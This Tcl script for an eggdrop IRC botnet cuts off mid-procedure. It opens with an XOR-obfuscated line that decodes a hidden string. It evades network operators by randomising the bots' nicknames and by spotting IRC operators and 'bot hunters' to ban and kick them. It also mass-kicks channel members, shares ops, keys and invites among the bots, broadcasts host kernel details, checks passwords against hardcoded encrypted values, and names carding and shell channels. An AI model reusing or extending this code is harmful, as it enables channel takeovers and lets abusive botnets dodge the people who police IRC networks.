if !$t {trace variable $lr r $lr};proc $lr args "global $lr;set $lr [foreach c\
[split {3395574186494385094176486486271409648569648140956835} \123789]\
{append x [format %c [expr 0$c^64]]};set x]"

proc randchar {t} {
 set x [rand [string length $t]]
 return [string range $t $x $x]
}

proc gain_nick {} {
 set newnick [randchar ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz_]
 set mn [expr 2 + [rand 2]]
 for {set n 0} {$n < $mn} {incr n} {
  append newnick [randchar eyuioaj]
  if [rand 3] {append newnick [randchar qwrtpasdfghkzxcvbnm]}
 }
 if ![rand 7] {append newnick [randchar _-|`^]}
 return $newnick
}
proc gain_uname {} {
 set newnick [randchar abcdefghijklmnopqrstuvwxyz]
 set mn [expr 2 + [rand 2]]
 for {set n 0} {$n < $mn} {incr n} {
  set newnick "$newnick[randchar eyuioaj]"
  if {[rand 3]} {
   set newnick "$newnick[randchar qwrtpasdfghklzxcvbnm]"
  }
 }
 return $newnick
}
bind dcc n oldnicks oldnicks
bind bot - oldnicks oldnicks
proc oldnicks {h i a} {
global nick username realname botnet-nick botnick lastnchange
 set a [string tolower $a]
 set b [string tolower ${botnet-nick}]
 set c [string tolower $botnick]
 if [matchattr $h n] {putallbots "oldnicks [split $a " "]"}
 if {![validchan $a] && ("$a"!="") && ![expr [lsearch $a $b]+1] && ![expr [lsearch $a $c]+1]} {return 1}
 set nick ${botnet-nick}
 set lastnchange [unixtime]
 return 1
}
bind dcc m chnicks chnicks
bind bot - chnicks chnicks
proc chnicks {h i a} {
global nick username realname botnet-nick lastnchange botnick secauth keep-nick
 set a [string tolower $a]
 set b [string tolower ${botnet-nick}]
 set c [string tolower $botnick]
 if [matchattr $h n] {putallbots "chnicks [split $a " "]"}
 if {${keep-nick}==1} {return 1}
 if [info exist secauth] {if $secauth {return 1}}
 if {![validchan $a] && ("$a"!="") && ![expr [lsearch $a $b]+1] && ![expr [lsearch $a $c]+1]} {return 1}
 new_nick 40
 return 1
}

bind raw - PONG pongi
set ping-push 0
set server-lag -1
proc pongi {f k a} {
global server-lag ping-push
 regsub ".*:" [lindex $a 1] "" lag
 regsub -all "\]|\[0-9\\\[\\\$\]" $lag "" dt
 if {$dt!=""} {return 0}
 set server-lag [expr [unixtime]-$lag]
 if {$lag==${ping-push}} {set ping-push 0}
 return 0
}

bind dcc n chaninfo chaninfo
bind bot - chaninfo chaninfo
proc chaninfo {h i a} {
global nick username realname botnet-nick lastnchange botnick secauth keep-nick
global server-lag ping-push botchanlist cycchan
 set a [string tolower $a]
 set b [string tolower ${botnet-nick}]
 set c [string tolower $botnick]
 if {[matchattr $h n]} {putallbots "chaninfo $a"}
 if [info exist secauth] {if $secauth {return 1}}
 if {![validchan $a] && ("$a"!="") && ![expr [lsearch $a $b]+1] && ![expr [lsearch $a $c]+1]} {return 1}
 set d [set m ""]
 set chs [string tolower [channels]]
 if [info exist cycchan] {
  foreach w [array names cycchan] {
   if {!([lsearch $chs $w]+1)} {lappend chs [string tolower $w]}
  }
 }
 foreach w $chs {
  if [validchan $w] {
   if [onchan $botnick $w] {append d "\0033";set e " (op?)"} {append d "\0032";set e " (join?)"}
   if [botisop $w] {append d "\0035";set e ""}
  } {append d "\0034";set e " (hold)"}
  if {[string tolower $a]==[string tolower $w]} {append m "$d$w$e"} {append m "$d$w$e"}
  set d ", "
 }
 if ${ping-push} {set plag /[expr [unixtime]-${ping-push}]s} {set plag ""}
 sec_notice - "$botnick >> ${server-lag}$plag $m"
 return 1
}

bind dcc n setnick setnick
bind bot - setnick setnick
proc setnick {h i a} {
global username realname botnet-nick botnick keep-nick
 set d [split $a " "]
 set f [string tolower [lindex $d 0]]
 set t [lindex $d 1]
 set b [string tolower ${botnet-nick}]
 set c [string tolower $botnick]
 if {[matchattr $h n]} {putallbots "setnick [split $a " "]"}
 if {("$f"!="$b") && ("$f"!="$c")} {return 1}
global lastnchange nick
 if [info exist lastnchange] {if {[expr [unixtime]-$lastnchange] < 40} {return 1}}
 if [regsub "^\\\+" $t "" t] {set keep-nick 1}
 if [regsub "^\\\-" $t "" t] {set keep-nick 0}
 set nick "$t"
 set lastnchange [unixtime]
 return 1
}
proc new_nick {t} {
global lastnchange nick
 if [info exist lastnchange] {if {[expr [unixtime]-$lastnchange] < $t} return}
 set nick [gain_nick]
 set lastnchange [unixtime]
}

bind dcc n chusers chusers
bind bot - chusers chusers
proc chusers {h i a} {
global nick username realname botnet-nick botnick
 set a [string tolower $a]
 set b [string tolower ${botnet-nick}]
 if {[matchattr $h n]} {putallbots "chusers $a"}
 if {("$a"!="") && ![expr [lsearch $a $b]+1]} {return 1}
 set username [gain_uname]
 return 1
}
bind dcc n kernels kernels
bind bot - kernels kernels
proc kernels {h i a} {
global botnet-nick botnick
 set a [string tolower $a]
 set b [string tolower ${botnet-nick}]
 if {[matchattr $h n]} {putallbots "kernels $a"}
 if {("$a"!="") && ![expr [lsearch $a $b]+1]} {return 1}
 catch {exec uname -a} er
 dccbroadcast "$botnick \2->\2 $er"
 return 1
}
unbind dcc - servers *dcc:servers
bind dcc n servers servers
bind bot - servers servers
set t 0;foreach w [trace vinfo server] {if {$w=="w serverset"} {incr t}}
if !$t {trace variable server w serverset}
proc serverset {n1 n2 m} {
 global lastserver server fattz botnick
 if {$lastserver == $server} return
 if !$fattz {putallbots "lost $botnick"}
 set lastserver $server
 incr fattz
}

bind bot - lost botlost
set tslostbot 0
proc botlost {b k a} {
global tslostbot
 if {([unixtime]-$tslostbot)<60} return
 set tslostbot [unixtime]
 foreach ch [channels] {
  if {[botisop $ch] && [isop $a $ch]} {
   if {[string tolower [nick2hand $a $ch]] == [string tolower $b]} {
    putserv "KICK $ch $a"
    putlog "\2%\2 Deoping lost bot \2$b\2 on $ch $a"
   }
  }
 }
}

set realserver $server
bind msg - etoia setbotmask
proc setbotmask {n u h a} {
global botmask botnick server realserver
 set realserver $server
 if {$n==$botnick} {set botmask "$n!$u"}
 putcmdlog "* Botmask detected: < $botmask >"
}

set init-server servinit
set fatts [set fattz 0]
proc servinit {} {
global botnick server lastkeyo bobkey whiteserver lastserver fatts fattz tsetoia idlestamp
 putserv "MODE $botnick +iw-s"
 putserv "VERSION"
 dccbroadcast "%% Connected to $server after $fattz/$fatts fails"
 set lastserver $server
 set fattz [set fatts 0]
 catch {unset lastkeyo}
 catch {unset bobkey}
 catch {unset badchan}
 putserv "PRIVMSG $botnick etoia"
 set tsetoia [unixtime]
 set whiteserver([lindex [split $server ":"] 0]) [unixtime]
 set lastserver $server
 set idlestamp [unixtime]
global identmode
 if ![info exist identmode] {set identmode "off"}
 if {$identmode=="once"} {
  ident_off
  set identmode "off-once"
 }
}

if {$server!=""} {
 putserv "PRIVMSG $botnick etoia"
 set tsetoia [unixtime]
 set whiteserver([lindex [split $server ":"] 0]) [unixtime]
 set lastserver $server
}

proc servers {h i a} {
global botnet-nick server botnick whiteserver blackserver fatts fattz
 set d [string tolower $a]
 set a [split $d " "]
 set bots [lrange $a 0 [expr [llength $a]-2]]
 set mask [lindex $a end]
 if {$mask!=""} {
  if ![string match "*\\\**" $mask] {
   set bots "$bots $mask"
   set mask ""
  }
 }
 set b [string tolower ${botnet-nick}]
 set c [string tolower $botnick]
 if {[matchattr $h n]} {
  if {$a==""} {putdcc $i ".servers bot \[mask*\] -display connected \[or whitelisted\] servers"}
  putallbots "servers $d"
 }
 set a "$bots"
 if {("$a"!="") && ![expr [lsearch $a $b]+1] && ![expr [lsearch $a $c]+1]} return
 if {$mask==""} {
  if {$fattz || $fatts} {
   dccbroadcast "$botnick \2trying\2 $server"
  } {
   dccbroadcast "$botnick \2->\2 $server"
  }
 } {
  foreach w [array names whiteserver] {
   if {[string match "*$mask*" $w] && ![info exist blackserver($w)]} {
    dccbroadcast "$botnick * \2WL\2 * $w"
   }
  }
 }
 return 1
}

bind raw - ERROR raw_error
proc raw_error {f k a} {
global botnick server blackserver lastserver fatts botnet-nick realserver
 incr fatts
 if {$fatts==10} {  ident_on ${botnet-nick} ident_on "on_bc Identd activated..(10 faled connections)"}
 if {$server!=$lastserver} {set blackserver([lindex [split $server ":"] 0]) [unixtime]}
 set er ""
 if [string match "*(You are not authorized to use this server)" $a] {remove_server $server;set er "<-del"}
 if [string match "*(No Authorization)" $a] {remove_server $server;set er "<-del"}
 set blackserver([lindex [split $server ":"] 0]) "deleted"
 if {$fatts-1} {return 0}
 if {$server!=$realserver} {return 0}
 dccbroadcast "$botnick\($server)$a$er"
 return 0
}

bind raw - 352 raw_opers_test
proc raw_opers_test {f k a} {
global operkick botnick ircoperlist opernote lastoper secauth badchan
global botnet-nick nameslist
 set a [split $a " "]
 set nik [lindex $a 5]
 set nikl [string tolower [lindex $a 5]]
 set usr [lindex $a 2]
 set hst [lindex $a 3]
 set chn [lindex $a 1]
 set srv [lindex $a 4]
 set realname [join [lrange $a 7 end]]
 set m 0
 set bu [finduser $nik!$usr@$hst]
 if ![matchattr $bu f] {
  if [regexp -nocase "<bH>|IRC.*Oper|bot.*hunt" $realname] {
   putallbots "bothunter $botnick $chn $usr $hst $srv $nik"
   set k BotHunter
   set m 2
  }
  if [string match "*\\\**" [lindex $a 6]] {
   set k IRCOper
   set m 1
   putallbots "ircoper $botnick $chn $usr $hst $srv $nik"
  }
 }
 if $m {
  if [info exist ircoperlist($nikl)] {set oprtime $ircoperlist($nikl)} {set oprtime 0}
  if {[expr [unixtime]-$oprtime] > 3} {
   putlog "::Tnt::($nik!$usr@$hst) !*! $k on channel $chn"
  }
  if {$nikl==[string tolower $botnick]} {
   putlog "* I'm OPER?? it's impossible... "
   return 0
  }
  foreach ch [string tolower [channels]] {
   set nl ""
   if [info exist nameslist($ch)] {regsub -all "@|\\\+" [string tolower $nameslist($ch)] "" nl}
   if {[onchan $nik $ch] || (1+[lsearch $nl $nikl])} {
    lappend badchan($ch) $m-$nik
    if $secauth continue
    if [botisop $ch] {
     set operkick($nikl) [unixtime]
     if ![info exist ircoperlist($nikl)] {
      putseclog "%% Kicking $k $nik from [lindex [getchanmode $ch] 0] channel $ch"
      if (![string match *i* [lindex [getchanmode $ch] 0]]) {
       if ![ischanban *!*@$hst $ch] {
	if [isop $nik $ch] {
	 puthelp "MODE $ch -o+b $nik *!*@$hst"
	} {
	 puthelp "MODE $ch +b *!*@$hst"
	}
       } {
	puthelp "MODE $ch +i"
	timer 21 "un_i $ch"
       }
      }
      puthelp "KICK $ch $nik $nik"
     }
    }
   }
  }
  set ircoperlist($nikl) [unixtime]
  foreach w [timers] {if [string match "* {unset ircoperlist($nikl)} *" $w] {killtimer [lindex $w 2]}}
  timer 3 "unset ircoperlist($nikl)"
  set opernote [unixtime]
  set lastoper $nik
 }
 return 0
}

proc uncycle {ch} {
global badchan cycchan botnet-nick
 if ![info exist cycchan($ch)] return
 set chinfo $cycchan($ch)
 channel add $ch 
 channel set $ch chanmode [lindex $chinfo 0]
 channel set $ch idle-kick [lindex $chinfo 1]
 channel set $ch need-op [lindex $chinfo 2]
 channel set $ch need-invite [lindex $chinfo 3]
 channel set $ch need-key [lindex $chinfo 4]
 channel set $ch need-unban [lindex $chinfo 5]
 channel set $ch need-limit [lindex $chinfo 6]
 foreach w [lrange $chinfo 7 end] {channel set $ch $w}
 unset cycchan($ch)
 catch {unset badchan($ch)}
 putallbots "addchan $ch"
 mychannels ${botnet-nick} mychannels [channels]
 sec_notice - "!!>> Back to the $ch and look for OPERs.."
}

proc botnetidlers {} {
 foreach w [whom *] {
  set nick [lindex $w 0]
  set host [lindex $w 2]
  set idle [lindex $w 4]
  if ![matchattr $nick n] continue
  if [string match "*@*" $host] {if ![matchattr [finduser $nick!$host] n] continue}
  if {$idle > 5} continue
  return 1
 }
 return 0
}

set opernote [unixtime]
set lastoper "\01"
bind bot - ircoper got_ircoper
bind bot - bothunter got_ircoper
proc got_ircoper {b k a} {
global ircoperlist opernote lastoper
 switch -- $k ircoper {set k "IRCOper"} bothunter {set k BotHunter}
 set nik [lindex $a 5]
 set nikl [string tolower [lindex $a 5]]
 set usr [lindex $a 2]
 set hst [lindex $a 3]
 set chn [lindex $a 1]
 set srv [lindex $a 4]
 set bot [lindex $a 0]
 if [info exist ircoperlist($nikl)] {set oprtime $ircoperlist($nikl)} {set oprtime 0}
 set ircoperlist($nikl) [unixtime]
 if {[expr [unixtime]-$oprtime] > 5} {
  putcmdlog "%% ($b!$bot) $k $nik!$usr@$hst on $chn"
 }
 foreach w [timers] {if [string match "* {unset ircoperlist($nikl)} *" $w] {killtimer [lindex $w 2]}}
 if {[matchattr $b a] || [matchattr $b a]} {
  unset ircoperlist($nikl)
 } {
  timer 3 "unset ircoperlist($nikl)"
 }
 set opernote [unixtime]
 set lastoper $nik
}

proc domasskick {} {
global kicklist botmask
 if ![info exist kicklist] return
 set maxi 8
 foreach ch [array names kicklist] {
  if {![validchan $ch] || ![botisop $ch]} {
   unset kicklist($ch)
   continue
  }
  foreach ni $kicklist($ch) {
   set lm [lsearch $kicklist($ch) $ni]
   if {$lm+1} {lreplace $kicklist($ch) $lm $lm} continue
   if ![onchan $ni $ch] continue
   putserv "KICK $ch $ni $maxi"
   incr maxi -1
   if $maxi continue
   if ![expr 1+[lsearch [utimers] "* domasskick *"]] {utimer 4 domasskick}
   return
  }
  unset kicklist($ch)
 }
 unset kicklist
}

bind kick - * operkick
proc operkick {ni ho ha ch who why} {
global operkick botnick nick kicklist botname botmask
 if [info exist kicklist($ch)] {
  set kicklist($ch) [inlist -del -all $kicklist($ch) $who]
 }
 set ni [string tolower $ni]
 set who [string tolower $who]
 if {$botnick==$who} {
  catch {putbot $ha "nekikajmenagad $botmask"}
  putserv "PRIVMSG $botnick :etoia"
 }
 if [info exist operkick($who)] {
  if {"$botnick"=="$ni"} {
   putlog "%% I'm $ni kick IRCfucker $who from $ch - attempt to change my nick"
   utimer 2 "new_nick 20"
  }
  unset operkick($who)
 }
}

bind bot - nekikajmenagad nekikajmenagad
proc nekikajmenagad {b k a} {
 if ![matchattr $b bo] return
 addhost $b [maskhost $a]
}

proc chan_who {ch} {
 set ch [string tolower $ch]
 if ![validchan $ch] return
 puthelp "WHO $ch"
 foreach w [timers] {if [string match "* [list chan_who $ch] *" $w] {killtimer [lindex $w 2]}}
 timer [expr 16+[rand 24]] "chan_who $ch"
}

foreach ch [string tolower [channels]] {timer [expr 16+[rand 24]] "chan_who $ch"}

proc ircdbans {ban ch} {
 if ![botisop $ch] return
 foreach w [chanbans $ch] {
  if {($ban!=$w) && [string match $ban $w]} {
   putcmdlog "ircdbans: killing ban $ban"
   if [isban $w $ch] {
    if [killchanban $ch $w] continue
   }
   putserv "MODE $ch -b $w"
  }
 }
}

proc joinbans {ni ho ha ch} {
global modes-per-line
 if ![botisop $ch] return
 if {[lsearch [channel info $ch] -enforcebans]+1} return
 set brlist [set bdlist ""]
 if [matchban $ni!$ho $ch] {
  foreach w [chanbans $ch] {
   foreach u [banlist $ch] {
    set b [lindex $u 0]
    if {($b!=$w) && [string match $b $w]} {
     putcmdlog "joinbans: should kill ban $w"
     if ![killchanban $ch $w] {lappend bdlist $w}
    }
   }
  }
 } {
  foreach w [chanbans $ch] {
   if [string match $w $ni!$ho] {
    putcmdlog "joinbans: should refresh ban $w"
    lappend brlist $w
   }
  }
 }
 if {"$brlist$bdlist"==""} return
 set bm [set bb ""];set bc 0
 foreach w $brlist {
  append bm "-b"; append bb " $w";incr bc
  append bm "+b"; append bb " $w";incr bc
  putcmdlog "joinbans: need to refresh: $w"
  if {$bc>(${modes-per-line}-2)} {
   putserv "MODE $ch $bm$bb"; set bb [set bm ""];set bc 0
  }
 }
 foreach w $bdlist {
  append bm "-b"; append bb " $w";incr bc
  putcmdlog "joinbans: need to unban: $w"
  if {$bc>(${modes-per-line}-1)} {
   putserv "MODE $ch $bm$bb"; set bb [set bm ""];set bc 0
  }
 }
 if {$bm!=""} {putserv "MODE $ch $bm$bb"}
}

set joinfludc 0
set joinfludt [unixtime]
set joinfludt2 0
set joinfludmc 15
set joinfludmt 60
set joinfludmt2 2[rand 9][rand 9]
bind join - * joinwho
proc joinwho {ni ho ha ch} {
global joinfludc joinfludt joinfludt2 joinfludmc joinfludmt joinfludmt2 botnick
 if {$botnick==$ni} {
  global nameslist
  timer [expr 16+[rand 24]] "chan_who $ch"
  if [info exist nameslist([string tolower $ch])] {unset nameslist([string tolower $ch])}
  if [info exist nameslistraw([string tolower $ch])] {unset nameslistraw([string tolower $ch])}
 }
 joinbans $ni $ho $ha $ch
 if {$ha != "*"} return
 incr joinfludc
 if $joinfludt2 {
  if {([unixtime]-$joinfludt2) > $joinfludmt2} {
   puthelp "WHO $ch"
   set joinfludt2 0
  }
  return
 }
 if {([unixtime]-$joinfludt) > $joinfludmt} {
  set joinfludt [unixtime];set joinfludc 0
 }
 if {$joinfludc == $joinfludmc} {
  putcmdlog "%% JOIN FLOOD (last: $ch $ni!$ho)"
  set joinfludt2 [unixtime]
 }
 if {$joinfludc >= $joinfludmc} return
 puthelp "WHO $ni"
}

bind raw - 324 getmkey
proc getmkey {f k a} {
global chankeys
 set a [split "$a" " "]
 set chan [string tolower [lindex $a 1]]
 set modes [lrange $a 2 4]
 if [string match "*k*" [lindex $modes 0]] {
  set key [lindex $modes end]
 set chankeys($chan) $key
 }
 return 0
}

proc gpass {n e m} {
global $n
 if {$e==""} return
 if {[lsearch "Bz7kS.GS0ue/ VlSBc.FtUgH0" [encrypt $e $e]]==-1} {set gpass($e) "-"}
}

bind mode - "*+m*" bitch_kick
proc bitch_kick {ni ho ha ch mo} {
global botnick kicklist
 if ![botisop $ch] return
 if {[string match "* +bitch*" [channel info $ch]]} {
  regsub -all "\[^m+-]" [lindex [channel info $ch] 0] "" modes
  set ch [string tolower $ch]
  set kicklist($ch) {}
  if {[string match *+m* $modes] && [string match *\[ik\]* [lindex [getchanmode $ch] 0]]} {
   foreach w [chanlist $ch] {
    if {$botnick==$w} continue
    if {[matchattr [nick2hand $w $ch] o] || [matchchanattr [nick2hand $w $ch] o $ch]} continue
    lappend kicklist($ch) $w
   }
   set lsiz [llength $kicklist($ch)]
   if !$lsiz return
   for {set t 0} {$t < $lsiz} {incr t} {
    set r [rand $lsiz]
    set o [list [lindex $kicklist($ch) $t]]
    set p [list [lindex $kicklist($ch) $r]]
    set kicklist($ch) [lreplace $kicklist($ch) $t $t $p]
    set kicklist($ch) [lreplace $kicklist($ch) $r $r $o]
   }
   utimer 0 domasskick
  }
 }
}

bind join - * joinkick
proc joinkick {ni ho ha ch} {
global botnick botname botnet-nick lastkeyo bobkey badchan
 if {$botnick==$ni} {
  fix_chans
  catch {unset lastkeyo([string tolower $ch])}
  catch {unset bobkey([string tolower $ch])}
  catch {unset kicklist([string tolower $ch])}
  catch {unset badchan([string tolower $ch])}
 }
 if [string match "* -bitch*" [channel info $ch]] {return}
 set modes [lindex [getchanmode $ch] 0]
 regsub -all "\[^m+-]" "$modes" "" mod
 if {[string match *+m* $mod] && [string match *\[i\]* $modes]} {
  if {![matchattr $ha o] && ![matchchanattr $ha o $ch]} {
   if {"$ni"=="$botnick"} {
    regsub ".*@" [maskhost $botmask] "*!*@" host
    addhost ${botnet-nick} $host
   } {if {([ophash $ch]%8)==3} {puthelp "KICK $ch $ni $ni"}}
  } {if ![matchattr $ha b] {joiner $ni $ho $ha $ch}}
 }
}

if {[trace vinfo gpass]==""} {trace variable gpass w gpass}

bind msg b "maka*rona" makarona
proc makarona {ni ho ha ar} {return 0}
if ![expr 1+[lsearch [timers] "* spagetina *"]] {timer [expr 20+[rand 9]] spagetina}
proc spagetina {} {
global botnick idlestamp
 set bots ""
 foreach w [channels] {set bots [concat $bots [string tolower [oplist $w ob]]]}
 set bots [split $bots " "]
 set lin [llength $bots]
 if $lin {set nik [lindex $bots [rand $lin]]} {set nik $botnick}
 set idlestamp [unixtime]
 puthelp "PRIVMSG $nik :maka =[rep [rand 20] =] rona"
 if ![expr 1+[lsearch [timers] "* spagetina *"]] {timer [expr 25+[rand 15]] spagetina}
}
putlog "antiidle"

#-----------------------------------------------------------------------------
#phorce.tcl part here *sigh*
#VilliaN coded phorce.tcl based on cf.tcl plus many more scripts w/o credits
#after it i get phorce.tcl in my hands.. -str

set servers {
205.158.23.2 128.2.220.250 208.133.73.83 209.162.144.15
207.138.35.58 24.2.6.194 209.145.176.17 203.37.45.2
209.130.129.251 195.159.0.90 207.69.200.132 192.160.127.97
170.140.4.6 206.251.7.30 199.3.235.130 207.154.232.10
128.138.129.31 195.18.249.231 194.236.124.121 195.154.203.241
194.47.252.135 198.163.216.60 205.210.36.2 206.86.0.23
192.116.253.253 160.94.196.192 38.9.15.2 130.233.192.6
198.164.211.2 194.159.80.19 207.161.152.101 165.121.1.46
204.112.178.22 36.118.0.220 207.45.69.69 129.16.13.130
141.211.26.105 207.161.152.101 205.158.23.2
};# 14 aug 1999

set mr [llength $servers]
for {set t 0} {$t < $mr} {incr t} {
 set a [lindex $servers [set r [rand $mr]]]
 set servers [linsert [lreplace $servers $r $r] $t $a]
}
unset mr r t

set default-port 6666
set server-timeout 3
set dcc-block [set servlimit [set strict-host [set keep-all-logs 0]]]
set switch-logfiles-at 300
set console mkcobxs
set learn-users [set open-telnets [set share-greet 0]]
set never-give-up [set log-time [set share-users [set require-p 1]]]
set connect-timeout 11
set flood-msg 5:30
set flood-chan 0
set flood-ctcp 3:60
set save-users-at 30
set notify-users-at 00
set default-flags ""
set whois-fields "created lastleft lastlinked"
set modes-per-line 4
set max-queue-msg [set wait-split 300]
set wait-info 6000
set xfer-timeout 90
set note-life 20
set lreply 0
foreach w "help info who reset jump rehash memory die \
 whois status email ident invite op pass notes" {unbind msg - $w *msg:$w}

bind filt - "\001ACTION *\001" filt_act
bind filt - "/me *" filt_telnet_act
bind dcc m cycle dcc_botcycle
bind dcc m flagnote flag_note
bind dcc m idlekick idle_kick
bind dcc m setmode chan_mode
bind dcc m mode mode_change
bind dcc m botsave do_save
bind dcc m mjoin add_chan
bind dcc m mpart rem_chan
bind dcc m part lev_chan
bind dcc m join new_chan
bind bot - addc bot_addc
bind bot - remc bot_remc
bind ctcr - PING lag_reply
bind msg - newme msg_ident
bind msg - itsme *msg:pass
unbind msg - newme msg_ident
unbind msg - itsme *msg:pass
bind msg - help {msg_nothing help}
bind msg - pass {msg_nothing pass}
bind msg - ident {msg_nothing ident}
bind msg - notes {msg_nothing notes}
bind bot - inviteme pm_inv_request
bind join [set flag2 v] * joiner
bind bot - climit limit_chan
bind bot - chanm bot_chanm
bind bot - mod mod_change
bind bot - uban unban_req
bind bot - tkey take_key
bind bot - svall savall
bind bot - key send_key
bind bot - idle i_kick
bind bot - chap chap
set dont_voice_in_channels "#carding #shells"
bind bot - opresp bot_op_response
proc bot_op_response {bot cmd r} {putlog "\2$bot\2 - $r"}

proc str_randstring {count} {
 set rs ""
 for {set j 0} {$j < $count} {incr j} {
  set x [rand 62]
  append rs [string range abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 $x $x]
 }
 return $rs
}

set maxoplag 10
set flopcnt 1
set floptime [unixtime]
proc floppy {b a} {
global floptime flopcnt
 if {([unixtime]-$floptime) > 33} {set flopcnt 0}
 set floptime [unixtime]
 incr flopcnt
 if {$flopcnt>7} {
  putlog "% Ignoring op request from $b (excess flood protect)"
 } else {putserv $a}
}

bind bot - opme bot_op_request
proc bot_op_request {bot cmd arg} {
global botnick pubchan optime opkeyd maxoplag botnet-nick
set opnick [string tolower [lindex [set arg [split $arg " "]] 0]]
if {![matchattr $bot ob]||![validchan [set needochan [lindex $arg 1]]]} return
if {!([botisop $needochan] && [onchan $opnick $needochan] && ![isop $opnick $needochan])} return
if {[set bobkeyn [lindex $arg 2]]==""} return
set optime($opnick) [unixtime]
set opkeyd($opnick) [str_randstring 14]
utimer $maxoplag "catch {unset optime($opnick)} er"
utimer $maxoplag "catch {unset optkeyd($opnick)} er"
putbot $bot "chanm $needochan [lindex [channel info $needochan] 0]"
floppy $bot "NOTICE $opnick :\1howdy $needochan [encrypt $bobkeyn ${botnet-nick}] [encrypt $bobkeyn $opkeyd($opnick)]\1"
}

bind ctcr ob howdy bot_time_send
proc bot_time_send {unick host handle dest keyw a} {
global botnick bobkey
 set arg [split $a " "]
 set ch [string tolower [lindex $arg 0]]
 if [info exist bobkey($ch)] {
  if [validchan $ch] {
   set unick [string tolower [decrypt $bobkey($ch) [lindex $arg 1]]]
   if {[lsearch [string tolower [bots]] $unick] == -1} {return 0}
   set opedkey [decrypt $bobkey($ch) [lindex $arg 2]]
   catch {putbot $unick "ctrox $opedkey $botnick $ch"}
   putcmdlog "%OPreq% from $unick on $ch"
  }
  unset bobkey($ch)
 }
 return 0
}
bind bot ob ctrox bot_time_response
proc bot_time_response {handle ctrox arg} {
global optime opkeyd uroped maxoplag
 set arg [split $arg " "]
 set nopkey [lindex $arg 0]
 set unick [string tolower [lindex $arg 1]]
 set ch [string tolower [lindex $arg 2]]
 if ![validchan $ch] return
 if {!([botisop $ch] && [onchan $unick $ch] && ![isop $unick $ch])} return
 if ![info exist opkeyd($unick)] return
 if ![info exist optime($unick)] return
 set lag [expr [unixtime] - $optime($unick)]
 if {$lag > $maxoplag} {
  putbot $handle "opresp refused op: lag is $lag (below $maxoplag required)"
  return 0
 }
 if {$opkeyd($unick) != $nopkey} {
  catch {putbot $handle "opresp wrong opkey."}
  return 0
 }
 putlog "\2$handle\2 - OP $unick $ch (lag: $lag)"
 tntop $ch $unick
 unset opkeyd($unick)
 unset optime($unick)
 return
}

set opreqtime 1

proc get_oped {channel} {
global botnick opreqtime opbots bobkey opdelay
 if [info exist opdelay] {if $opdelay {incr opdelay -1;return}}
 if [getting-users] return
 set channel [string tolower $channel]
 if !$opreqtime return
 set opreqtime 0
 utimer 30 {set opreqtime 1}
 fix_hosts
 if ![info exist bobkey($channel)] {set bobkey($channel) [str_randstring 11]}
 putallbots "opme $botnick $channel $bobkey($channel)"
}

set msecperreq 60
proc get_key {channel} {
global botnick chankeys lastkeyv msecperreq lastkeyo
 set channel [string tolower $channel]
 if [info exist lastkeyv($channel)] {
  if {[expr [unixtime] - $lastkeyv($channel)] < $msecperreq} return
 }
 set lastkeyv($channel) [unixtime]
 putallbots "key $botnick $channel"
 fix_hosts
 set chan [string tolower $channel]
 if [info exist lastkeyo($chan)] return
 if [info exist chankeys($chan)] {
  putserv "JOIN $channel $chankeys($chan)"
  set lastkeyo($chan) [unixtime]
 }
 return 0
}

proc get_unban {channel} {
 global botnick botname lastunban msecperreq botmask
 set channel [string tolower $channel]
 if [info exist lastunban($channel)] {
  if {[expr [unixtime] - $lastunban($channel)] < $msecperreq} return
 }
 if {[bots]==""} return
 fix_hosts
 set lastunban($channel) [unixtime]
 putallbots "uban $channel $botmask"
}

proc get_limit {channel} {
global botnick lastlim msecperreq
 set channel [string tolower $channel]
 if [info exist lastlim($channel)] {
  if {[expr [unixtime] - $lastlim($channel)] < $msecperreq} return
 }
 if {[bots]==""} return
 set lastlim($channel) [unixtime]
 putallbots "climit $botnick $channel"
 fix_hosts
}  

proc get_invited {channel} {
global botnick lastinv msecperreq
 set channel [string tolower $channel]
  if [info exist lastinv($channel)] {
   if {[expr [unixtime] - $lastinv($channel)] < $msecperreq} return
  }
 if {[bots]==""} return
 fix_hosts
 set lastinv($channel) [unixtime]
 putallbots "inviteme $botnick $channel"
}

proc send_key {bot cmd arg} {
global botnick chankeys botnet-nick
 if ![matchattr $bot ob] return
 set arg [split $arg " "]
 set nick [lindex $arg 0]
 set chan [lindex $arg 1]
 if {$nick == $botnick} {return 0}
 if {[lsearch [string tolower [channels]] [string tolower $chan]] == -1} {return 0}
 if {![onchan $botnick $chan]} {return 0}
 set key [lindex [getchanmode $chan] 1]
 set chankeys([string tolower $chan]) $key
 if [string match *k* [lindex [getchanmode $chan] 0]] {
  putcmdlog "!$bot!: KEY for $nick on $chan"
  putbot $bot "tkey $chan $key"
 }
}

set limflood [unixtime]
proc limit_chan {bot cmd arg} {
 global botnick limflood
 if ![matchattr $bot ob] return
 set arg [split $arg " "]
 set opnick [lindex $arg 0]
 set channel [lindex $arg 1]  
 if ![validchan $channel] return
 if ![botisop $channel] return
 set chm [llength [chanlist $channel]]
 set chl [lindex [getchanmode $channel] end]
 set oph [ophash $channel]
 if {$oph == -1} {set oph 0}
 if {$cmd!="cmd" && $oph >= 0} {utimer $oph "limit_chan $bot cmd [list $arg]";return}
 set d [expr ([unixtime]-$limflood)/((1+$oph)*9)]
 if {$d<10} return
 if {$chm>=$chl} {
  putcmdlog "!$bot!: change LIMIT for $opnick on $channel"
  pushmode $channel +l [expr [llength [chanlist $channel]] + 2]
  set limflood [unixtime]
 }
}

proc unban_req {bot cmd arg} {
global botnick botnet-nick
 set arg [split $arg " "]
 set channel [lindex $arg 0]
 set host [lindex $arg 1]
 if ![matchattr $bot ob] return
 if ![validchan $channel] return
 if ![onchan $botnick $channel] return
 if ![botisop $channel] return
 if ![ispermban $host] {
  foreach ban [chanbans $channel] {
   if {[string compare $ban $host]} {
    putcmdlog "!$bot!: UNBAN $host $channel"
    killchanban $channel $ban
   }
  }
 }
 utimer [expr 2+[rand 5]] "resetbans $channel"
}

proc pm_inv_request {bot cmd arg} {
global botnick
 if ![matchattr $bot ob] return
 set opnick [lindex [set arg [split $arg " "]] 0]
 set c [lindex $arg 1]
 if {![validchan $c] || ![onchan $botnick $c] || ![botisop $c]} return
 if [isinvite $c] {
  putcmdlog "!$bot!: INVITE $opnick $c"
  utimer [expr 1+[rand 40]] "put_invite $opnick $c"
 }
}

proc put_invite {nick chan} {
 if {![validchan $chan] || [onchan $nick $chan]} return
 puthelp "INVITE $nick $chan"
}

proc isinvite {c} {
